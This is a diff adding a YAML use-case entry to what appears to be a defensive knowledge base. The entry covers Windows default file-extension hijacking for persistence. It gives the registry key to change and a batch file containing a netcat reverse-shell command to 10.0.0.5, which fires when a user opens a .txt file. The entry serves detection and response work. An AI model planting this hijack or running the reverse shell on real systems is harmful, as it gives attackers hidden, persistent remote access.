@@ -1,0 +1,80 @@
+title: 'Hijacking Default File Extension'
+id: UC0052
+author: 'Alex@Cyberok'
+creation_date: 2023/02/28
+modification_date: 2023/02/28
+severity: M
+tags:
+  - persistence
+  - attack.t1546.001
+  - windows
+linked_response_playbooks:
+  - RP2005
+linked_artifacts:
+  - A1005
+  - A3002
+  - A5002
+description: The values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.
+extended_description: |
+
+    When a .txt file is double clicked, it's opened with a notepad.exe. Windows knows that it needs to use notepad.exe for opening txt files, because the .txt extension (among many others) are mapped to applictions that can open those files in Windows registry located at Computer\HKEY_CLASSES_ROOT.
+
+    It's possible to hijack a file extension and make it execute a malicious application before the actual file is opened.
+
+    ## Attack prerequisites
+
+    | ARTIFACT                                                                        | OBJECT                   | DESCRIPTION                                                                               |
+    |---------------------------------------------------------------------------------|--------------------------|-------------------------------------------------------------------------------------------|
+    |  **Attack Prerequisites**                                                       |
+    | [Host](/artifacts/A_1005_host/entity)                                           | Compromised host         | A host to which an attacker has privileged access                                         |
+    | **Side Observables**                                                            |
+    | [Windows Registry](/artifacts/A_5002_windows_registry/entity)                   | Extension handler          | Specifies a file name of the process should open                   |
+    | [File](/artifacts/A_3002_file/entity)                                           | File with extension handler   | Trigger for malicious file                                      |
+    | [File](/artifacts/A_3002_file/entity)                                           | Windows batch file with malicious code   | Code execution to gain persistense                   |
+
+
+    ## Attack results
+    Adversaries may take advantage of these features to repeatedly execute [malicious code]() and establish [persistence]().
+
+    | RESOURCE                                                              | DESCRIPTION                                                                               |
+    |-----------------------------------------------------------------------|-------------------------------------------------------------------------------------------|
+    | **Attack Prerequisites**                                              |                                                                                           |
+    | [Privileged Access]()                                                 | Compromised host with privileged access |
+    | **Result Consequences**                                               |                                                                                           |
+    | [Remote Code Execution]()                                             | Attacker gets an ability to execute commands on the remote host |
+    | [Persistense]()                                                       | Attacker can use reverse shell as a payload to establish access to the host |
+
+    ## Attack progress
+    1) The .txt extension handler is defined in the below registry key:
+    ```
+    Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command
+    ```
+    Below shows that the command responsible for opening .txt files is notepad.exe %1, where %1 is the argument for notepad.exe, which specifies a file name the notepad should open.
+
+    2) A target user has the [file]() test.txt on his desktop with file contents. Let's now create a [malicious file]() that we want to be executed when the user attempts to open the benign file test.txt. For this lab, the malicious file is going to be a simple Windows batch file located in c:\tools\shell.cmd:
+    ```
+    start C:\tools\netc.exe 10.0.0.5 443 -e C:\Windows\System32\cmd.exe
+    start notepad.exe %1
+    ```
+    Once executed, c:\tools\shell.cmd will launch malicious code to the attacking system and also a notepad with the test.txt file as an argument.
+
+    We are now ready to hijack the .txt file extension by modifying the value data of  Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command to c:\tools\shell.cmd %1 as shown below:
+    ![RegKey2](25.JPG)
+
+    ## Possible usage
+
+    ### Reverse shell
+    1) Once executed, c:\tools\shell.cmd will launch a simple netcat reverse shell to the attacking system and also a notepad with the test.txt file as an argument.
+
+    Opening the test.txt file by double clikcing it opens the file itself, but a reverse shell is thrown to the attacking system as well:
+    ![Demo](22.gif)
+
+    2) This persistence trick is used by [SILENTTRINITY framework](https://attack.mitre.org/software/S0692/) and [Kimsuky cyber espionage group](https://attack.mitre.org/groups/G0094/). This malware was used in a 2019 campaign against Croatian government agencies by unidentified cyber actors. SILENTTRINITY can conduct an image hijack of an .msc file extension as part of its UAC bypass process.
+
+    ## Attack diagram
+    ![Diagram](35.svg)
+
+    ## References
+    [Hijacking Default File Extension](https://www.ired.team/offensive-security/persistence/hijacking-default-file-extension)
+
+    [Malware development: persistence - part 9. Default file extension hijacking. Simple C++ example.](https://cocomelonc.github.io/malware/2022/08/26/malware-pers-9.html)
